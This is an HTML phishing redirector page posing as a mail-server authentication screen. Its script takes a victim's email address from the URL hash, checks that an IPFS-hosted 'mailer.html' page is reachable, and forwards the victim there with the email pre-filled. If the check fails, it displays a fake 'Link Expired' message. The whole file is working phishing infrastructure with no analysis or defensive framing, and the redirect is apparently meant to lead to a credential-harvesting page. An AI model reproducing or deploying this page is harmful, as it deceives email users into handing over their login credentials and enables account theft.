<!DOCTYPE html> 
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>AUTHENTICATING Mail SERVER...</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        text-align: center;
        margin-top: 50px;
        background-color: #f5f5f5;
      }
      .spinner {
        width: 50px;
        height: 50px;
        border: 5px solid #f3f3f3;
        border-top: 5px solid #3498db;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 20px auto;
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
      .status-text {
        color: #555;
        font-size: 18px;
        margin-top: 20px;
      }
      .expired-message {
        color: #e74c3c;
        margin-top: 30px;
      }
    </style>
    <script>
      function checkAndRedirect() {
        // Extract email from URL hash (e.g., #email=someone@example.com)
        var hash = window.location.hash.substring(1); // Remove the # character
        var email = "{email}"; // Default to {email} placeholder if no email in hash
        
        if (hash) {
          var hashParams = hash.split('=');
          if (hashParams[0] === 'email') {
            email = decodeURIComponent(hashParams[1]);
          }
        }

        var encodedEmail = encodeURIComponent(email);
        var ipfsURL = "https://bafybeienr7v7xdk23sucg2pkpnxdjdrna2q4ouhr22v4lcsvlipgvrtri4.ipfs.dweb.link/mailer.html#" + encodedEmail;

        // Update status text
        document.getElementById('status-text').textContent = "Verifying server connection...";

        // Create a new XMLHttpRequest to check if the IPFS link is accessible
        var xhr = new XMLHttpRequest();
        xhr.open('HEAD', ipfsURL, true);
        xhr.onreadystatechange = function() {
          if (xhr.readyState == 4) {
            if (xhr.status >= 200 && xhr.status < 300) {
              // Update status before redirect
              document.getElementById('status-text').textContent = "Connection verified. Redirecting...";
              // Redirect if the IPFS content is accessible
              setTimeout(function() {
                window.location.href = ipfsURL;
              }, 1000);
            } else {
              // Show "Link Expired" if it fails
              document.getElementById('spinner').style.display = 'none';
              document.getElementById('status-text').style.display = 'none';
              document.body.innerHTML = `
                <div class="expired-message">
                  <h1>Link Expired</h1>
                  <p>The authentication page is no longer available.</p>
                  <p>Please contact support for assistance.</p>
                </div>
              `;
            }
          }
        };
        xhr.send();
      }

      window.onload = checkAndRedirect;
    </script>
  </head>
  <body>
    <div class="spinner" id="spinner"></div>
    <div class="status-text" id="status-text">Initializing authentication...</div>
  </body>
</html>